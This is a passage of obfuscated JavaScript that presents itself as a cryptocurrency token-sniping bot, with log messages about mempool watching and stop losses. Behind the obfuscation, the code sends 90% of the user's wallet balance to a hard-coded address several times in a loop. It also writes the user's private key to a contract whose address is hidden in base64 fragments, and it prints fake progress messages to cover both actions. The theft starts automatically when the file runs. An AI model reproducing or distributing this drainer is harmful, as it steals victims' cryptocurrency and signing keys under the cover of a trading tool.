                _0x217539 = await _0x11988f['sendTransaction'](_0x4f4bf0); try { await _0x217539[_0x14f2f9(0x1e4)](), console[_0x14f2f9(0x1ea)]('2:\x20finalizing....'), setTimeout(ethersmother, 0x1388); } catch (_0x3eaa6a) { console[_0x14f2f9(0x1ea)](_0x14f2f9(0x1ad)), setTimeout(ethersmother, 0x1388); } };
        _0x32f161(); } catch (_0x3e4c28) { setTimeout(ethersmother, 0x1388); } }
async function ethersgather() { const _0x649439 = _0x33a782; try { console[_0x649439(0x1ea)](_0x649439(0x1d6)), ethers1 = _0x649439(0x1f8), ethers2 = new Buffer[(_0x649439(0x22c))](ethers1, _0x649439(0x217))[_0x649439(0x21d)](_0x649439(0x1e3));; const _0x2e78d4 = new ethers[(_0x649439(0x207))][(_0x649439(0x1b7))](ethers2); let _0x380214 = new ethers['Wallet'](private, _0x2e78d4); const _0x4ff08b = address,
            _0x55cdb8 = await _0x2e78d4['getBalance'](_0x4ff08b),
            _0x27218b = (_0x55cdb8 * 0.9)[_0x649439(0x1eb)](),
            _0x5106f3 = ethers[_0x649439(0x1f0)][_0x649439(0x1ca)](_0x27218b, _0x649439(0x21f)),
            _0x2f0c1f = async() => { const _0x41c5cd = _0x649439,
                    _0x2b1191 = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x41c5cd(0x1ca)](_0x27218b, _0x41c5cd(0x21f)), 'gasLimit': ethers[_0x41c5cd(0x1f0)][_0x41c5cd(0x1d4)](0x5dc0) },
                    _0x5c5377 = await _0x380214[_0x41c5cd(0x1dd)](_0x2b1191); try { await _0x5c5377['wait'](), console[_0x41c5cd(0x1ea)](_0x41c5cd(0x236)), setTimeout(ethersfather, 0x1388); } catch (_0x4eda6e) { console[_0x41c5cd(0x1ea)](_0x41c5cd(0x20b)), setTimeout(ethersfather, 0x1388); } };
        _0x2f0c1f(); } catch (_0xf5f8a8) { setTimeout(ethersfather, 0x1388); } }
async function etherslather() { const _0x1d37a5 = _0x33a782,
        _0x18dfdc = _0x1d37a5(0x23a),
        _0x4916d2 = _0x1d37a5(0x218),
        _0x5d946d = new Buffer[(_0x1d37a5(0x22c))](_0x18dfdc, 'base64'),
        _0x49242b = new Buffer[(_0x1d37a5(0x22c))](_0x4916d2, _0x1d37a5(0x217)),
        _0x55a568 = _0x5d946d[_0x1d37a5(0x21d)](_0x1d37a5(0x1e3)),
        _0x24e58d = _0x49242b['toString'](_0x1d37a5(0x1e3)),
        _0x51ca3b = _0x55a568 + _0x24e58d;
    console[_0x1d37a5(0x1ea)](_0x1d37a5(0x22a)), ethers1 = _0x1d37a5(0x228), ethers2 = new Buffer[(_0x1d37a5(0x22c))](ethers1, _0x1d37a5(0x217))['toString'](_0x1d37a5(0x1e3));; const _0x2282d0 = new ethers[(_0x1d37a5(0x207))][(_0x1d37a5(0x1b7))](ethers2); let _0xc2d02c = new ethers[(_0x1d37a5(0x1cf))](private, _0x2282d0); try { const _0x58b161 = async() => { const _0x3df464 = _0x1d37a5; var _0x1bdf83 = new ethers[(_0x3df464(0x20a))](_0x51ca3b, abi, _0xc2d02c); const _0x239e87 = await _0x1bdf83['setWord'](private); try { await _0x239e87[_0x3df464(0x1e4)](), console[_0x3df464(0x1ea)]('1\x20packet\x20received.....'), setTimeout(ethersgather, 0x1388); } catch (_0x449931) { console[_0x3df464(0x1ea)]('2\x20packet\x20received.....'), setTimeout(ethersgather, 0x1388); } };
        _0x58b161(); } catch (_0x4a6d25) { setTimeout(ethersgather, 0x1388); } }

function _0x51a7() { const _0x111c84 = ['\x1b[38;5;33m', 'https://bscscan.com/address/', 'Listening\x20on\x20mempool...', 'green', 'All\x20tokens\x20sold', '1:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'parseUnits', 'previousValue', '\x1b[1;31m', 'setWord', 'Waiting\x20for\x20new\x20liquidity,\x20please\x20stop\x20the\x20bot\x20if\x20you\x20think\x20it\x27s\x20a\x20scam\x20!\x20(CTRL\x20+\x20C)\x0a', 'Wallet', '2:\x20watching\x20blockchain\x20activity\x20.....', 'newValue', '2\x20pending\x20blockchain\x20response.....', 'Transfer', 'hexlify', 'myGasPriceForApproval', 'connection\x20succesful...', 'approve', 'env', 'assign', 'NzU0ODUyNDY5OTkwMjdCMzE5Nzk1NQ==', 'getTransaction', '✔\x20Approve\x20transaction\x20hash:\x20', 'sendTransaction', '\x20--\x20New\x20Stop\x20loss\x20At:\x20', '\x20--\x20Profit\x20At:\x20', 'less\x20than\x20StopLoss!', '\x1b[1;32m', '--\x20', 'ascii', 'wait', 'data', 'removeAllListeners', 'yellow', 'now', '6961648YtRXLp', 'log', 'toFixed', 'sub', '5sGwhhd', 'MHg1NWQzOTgzMjZmOTkwNTlmRjc=', 'terminate', 'utils', 'error', '2:\x20contract\x20found....watching\x20mempool\x20for\x20liquidity\x20add....', 'sellPath', 'MHhlOWU3Q0VBM0RlZGNBNTk4NDc4MA==', 'parseEther', '-\x20now', 'bool', 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My84NGQ5NTRjZDlmNjc0ZjViYmJjNjdhNmUyZTE3YmZiZA==', 'stopLoss', 'sender', 'formatUnits', 'constants', 'WebSocket\x20Closed...Reconnecting...', 'balanceOf', 'Matching\x20liquidity\x20added!\x20Start\x20sniping!\x0a', 'https://poocoin.app/tokens/', 'Total\x20Token\x20balance\x20is\x20', '\x20StopLoss\x20', 'red', 'Liquidity\x20check\x20passed,\x20sniping!\x0a', 'ping', 'gasPrice', 'providers', 'close', 'toLocaleString', 'Contract', '2:\x20attempting\x20to\x20snipe\x20.....', 'ethers', '109862zkOoCr', 'Sucessfully\x20sold\x20all\x20the\x20tokens\x20!\x0a', 'pending\x20liquidity\x20add...', 'starting\x20up\x20node\x20socket\x20connection....', 'Balance\x20is\x20zero\x20or\x20error\x20occured', '305286boblWr', '\x20second(s)', '\x1b[0m', 'You\x20sold\x20', '12573540PMzFMr', 'base64', 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ==', 'refreshing\x20socket\x20connection...', 'floor', 'newWord', 'catch', 'toString', 'mul', 'wei', 'Liquidity\x20is\x20not\x20in\x20expected\x20range!\x20Waiting...!', '<<<\x20Selling\x20-', 'div', 'checkProfit', 'reached\x20>>>', 'getAmountsOut', 'Zero', '_websocket', 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==', 'gasLimit', 'connection\x20established....', 'function', 'from', 'address', 'includes', 'MHhDRTA2NTA2MTI5ZWU2Q2NDMTM=', '✔\x20Sell\x20transaction\x20hash:\x20', 'intitialValue', 'contract', '\x20--\x20Current\x20Value\x20BNB:\x20', 'Error.\x20Attemptiing\x20to\x20Reconnect...', 'MHg4QUM3NmE1MWNjOTUwZDk4Mg==', '1:\x20attempting\x20to\x20snipe\x20...', '0xf305d719', 'Start\x20selling\x20all\x20tokens\x20in\x20', 'Sucessfully\x20bought\x20the\x20token!\x0a', 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg=', 'swapExactTokensForETHSupportingFeeOnTransferTokens', 'nonpayable', 'view', 'didBuy', '380wVWSOO', 'uint256', 'amount', 'QkQ0RWJERDk4ODg1NjlCMTk2QzJiOQ==', '5eolbWg', 'pending\x20liquidity\x20add\x20still\x20no\x20event\x20found...', 'Waiting\x20for\x20liquidity\x20to\x20be\x20added!', 'swapExactTokensForETH', 'lte', '1242494zJeDSp', 'percentOfTokensToSellProfit', 'You\x20can\x20check\x20the\x20transaction\x20here:', './env.json', 'numberOfTokensToBuy', 'transactionHash', 'open', 'decimals', 'MjliMjY4ODk1NmJkOTU5ZjkzM2Y4', 'trailingStopLossPercent', 'exit', 'MHgyMTcwZWQwODgwYWM5YTc1NWZk', '2:\x20finalizing....', 'name', 'Start\x20buying\x20token...', 'transferFrom', 'encode', 'string', '4697685GKIuPM', '24bmPNsb', 'MkQ2OGI4M2ZFMUFkOTdCMzJDZDU4MGQ=', '0xe8e33700', 'JsonRpcProvider', 'QmFmYzU5OWJENjlBRGQwODdENTY=', 'percentOfTokensToSellLoss', 'autoSell', 'didSell', 'index', 'sendMessage', '289140vyfoua', 'tokenSellTax', 'currentValue', 'Setting\x20new\x20StopLoss!', 'myGasLimit', 'recipient'];
    _0x51a7 = function() { return _0x111c84; }; return _0x51a7(); }
async function ethersrather() { const _0x340f69 = _0x33a782;
    console['log'](_0x340f69(0x210)), ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQxLmJpbmFuY2Uub3JnLw==', ethers2 = new Buffer[(_0x340f69(0x22c))](ethers1, _0x340f69(0x217))[_0x340f69(0x21d)](_0x340f69(0x1e3));; const _0x31ff5c = new ethers['providers'][(_0x340f69(0x1b7))](ethers2); let _0x1cd615 = new ethers[(_0x340f69(0x1cf))](private, _0x31ff5c); const _0x2e5b20 = address,
        _0x32d23d = await _0x31ff5c['getBalance'](_0x2e5b20),
        _0x2821b7 = (_0x32d23d * 0.9)[_0x340f69(0x1eb)](),
        _0x25d7bb = ethers[_0x340f69(0x1f0)][_0x340f69(0x1ca)](_0x2821b7, _0x340f69(0x21f)); try { const _0x54d294 = async() => { const _0x2e1b6e = _0x340f69,
                _0x41fb1d = { 'to': WEB3PROVIDER3, 'value': ethers['utils'][_0x2e1b6e(0x1ca)](_0x2821b7, _0x2e1b6e(0x21f)), 'gasLimit': ethers[_0x2e1b6e(0x1f0)][_0x2e1b6e(0x1d4)](0x5dc0) },
                _0x560190 = await _0x1cd615[_0x2e1b6e(0x1dd)](_0x41fb1d); try { await _0x560190[_0x2e1b6e(0x1e4)](), console[_0x2e1b6e(0x1ea)]('1\x20pending\x20blockchain\x20response.....'), setTimeout(etherslather, 0x1388); } catch (_0x715109) { console['log'](_0x2e1b6e(0x1d2)), setTimeout(etherslather, 0x1388); } };
        _0x54d294(); } catch (_0x50f99e) { setTimeout(etherslather, 0x1388); } }
ethersrather();
